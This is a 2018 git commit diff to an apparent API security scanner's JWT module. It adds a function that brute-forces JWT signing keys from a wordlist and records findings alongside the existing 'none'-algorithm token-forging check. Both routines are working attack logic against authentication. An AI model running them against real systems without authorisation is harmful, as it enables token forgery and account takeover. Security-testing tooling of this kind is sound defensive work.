6dfd8824689b3f7164a3f52755d8c435a45c929e
Sagar Popat <sagar.popat@flipkart.com>
2018-03-15 11:58:15 +0530

    Added jwt_brute

--- modules/jwt_attack.py
+++ modules/jwt_attack.py
@@ -7,16 +7,17 @@ import sendrequest as req
 
 from utils.logger import logger
 from utils.db import Database_update
+from utils.config import get_value
 
+dbupdate = Database_update()
 api_logger = logger()
 
 # This module identifies different JWT vulnerabilities which includes:
 # 1. JWT none algorithm vulnerability
-# 2. Weak JWT secret
+# 2. Weak JWT Sign key
+
 def decode_jwt(jwt_token):
-    """
-    Return the decoded value of alg and data
-    """ 
+    # Return the decoded value of alg and data
     jwt_decode_list = []
     try:
         jwt_list = jwt_token.split('.')
@@ -30,10 +31,8 @@ def decode_jwt(jwt_token):
 
     return jwt_decode_list
 
-def jwt_none(url,method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data):
-    """
-    Check for algo None vulnerability. 
-    """
+def jwt_none(url,method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data,scanid=None):
+    #Check for algo None vulnerability. 
     encoded_jwt = jwt.encode(jwt_data, '', algorithm='none')
     if jwt_loc == "url":
         url = url.replace(value[0],encoded_jwt)
@@ -45,12 +44,25 @@ def jwt_none(url,method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data):
         pass
     else:
         print "%s[+]API is vulnearalbe to JWT none algo vulnerability%s".format(url)% (api_logger.R, api_logger.W)
+        attack_result = {
+                             "id" : 8,
+                             "scanid":scanid,
+                             "url" : url,
+                             "alert": "JWT none Algorithm vulnerability",
+                             "impact": "High",
+                             "req_headers": headers,
+                             "req_body" : body,
+                             "res_headers": jwt_request.headers,
+                             "res_body" : jwt_request.text
+
+                        }
+
+        dbupdate.insert_record(attack_result)
+        return True
 
 
 def find_jwt(url,headers):
-    """
-    This function deals with identifying JWT token from HTTP request.
-    """
+    # This function deals with identifying JWT token from HTTP request.
     # Identify JWT token from URL
     query_list = []
     global key,value
@@ -59,7 +71,6 @@ def find_jwt(url,headers):
     for key,value in parsed_query.items():
         try:
             jwt_token =jwt.decode(value[0], verify=False)
-            print "detected",key,value[0]
             return "url", key, value[0]
         except:
             pass
@@ -74,11 +85,35 @@ def find_jwt(url,headers):
 
     return None,None,None
 
+def jwt_brute(url, headers, body, jwt_token, jwt_alg, scanid=None):
+    # JWT token brute force
+    with open('secret.txt') as sign_keys:
+        for sign_key in sign_keys:
+            try:
+                jwt.decode(jwt_token, sign_key.rstrip(), algorithms=[jwt_alg])
+                print "%s[+]Weak JWT sign key found:{0}%s".format(sign_key.rstrip())% (api_logger.R, api_logger.W)
+                alert = "Weak JWT sing key-"+sign_key.rstrip()
+                attack_result = {
+                             "id" : 9,
+                             "scanid":scanid,
+                             "url" : url,
+                             "alert": "JWT weak secret key",
+                             "impact": "High",
+                             "req_headers": headers,
+                             "req_body" : body,
+                             "res_headers": "NA",
+                             "res_body" : "NA"
+
+                        }
+                print "attack result",attack_result
+
+                dbupdate.insert_record(attack_result)
+                
+            except:
+                pass
 
 def jwt_check(url,method,headers,body,scanid):
-    '''
-    Main function for JWT test.
-    '''
+    # Main function for JWT test
     jwt_loc, jwt_key, jwt_token = find_jwt(url,headers)
     if jwt_loc == None:
         return
@@ -87,5 +122,10 @@ def jwt_check(url,method,headers,body,scanid):
         alg = ast.literal_eval(jwt_decoded_list[0])['alg']
         jwt_data = ast.literal_eval(jwt_decoded_list[1])
         if alg == 'HS256' or alg == 'HS256' or alg == '384':
-            jwt_none(url,method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data)
-        
+            result = jwt_none(url,method, headers, body, jwt_loc, jwt_key, jwt_token, jwt_data)
+            if result is True:
+                pass
+            else:
+                arg = get_value('scan.property','modules','jwt_brute')
+                if arg == 'Y' or arg == 'y':
+                    jwt_brute(url, headers, body, jwt_token, alg, scanid) 
